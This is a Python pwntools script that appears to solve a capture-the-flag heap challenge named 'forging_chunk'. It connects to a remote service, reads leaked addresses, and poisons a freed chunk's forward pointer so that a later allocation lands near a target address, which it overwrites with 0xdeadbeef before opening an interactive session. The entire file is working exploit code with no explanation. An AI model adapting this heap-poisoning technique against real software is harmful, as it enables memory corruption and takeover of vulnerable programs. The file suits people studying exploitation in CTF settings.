#!/usr/bin/env python3
from pwn import *
import pwnlib.shellcraft
#elf = ELF('./forging_chunk')

debug = 0

context.os='linux'

# need Ubuntu ???
# using tmux to run
context.terminal = ['tmux', 'splitw', '-h']

if debug == 1:
    gdbcmd = '''
    '''
    c = process('./forging_chunk')
    # gdb.attach(c, gdbcmd)
    context.log_level ='debug'
else:
    c = remote('140.110.112.77', 9001)
    context.log_level ='debug'


def select(menu_select, x):
    c.sendlineafter('input:', str(menu_select))
    c.sendlineafter('x = ', str(x))

def free(index):
    select(0, index)

def malloc(index):
    select(1, index)

def write(index, data):
    select(2, index)
    c.sendlineafter('string = ', data)

def show(index):
    select(3, index)


c.recvuntil("victim's address:");
victim_addr = int(c.recvline()[:-1], 16)
print(hex(victim_addr))

c.recvuntil("size's address:");
size_addr = int(c.recvline()[:-1], 16)
print(hex(size_addr))

malloc(0)
free(0)
write(0, p64(size_addr - 8))
malloc(0)
malloc(0)
write(0, p64(0xdeadbeef))


c.sendlineafter('input:', str(10))

c.interactive()
c.close()

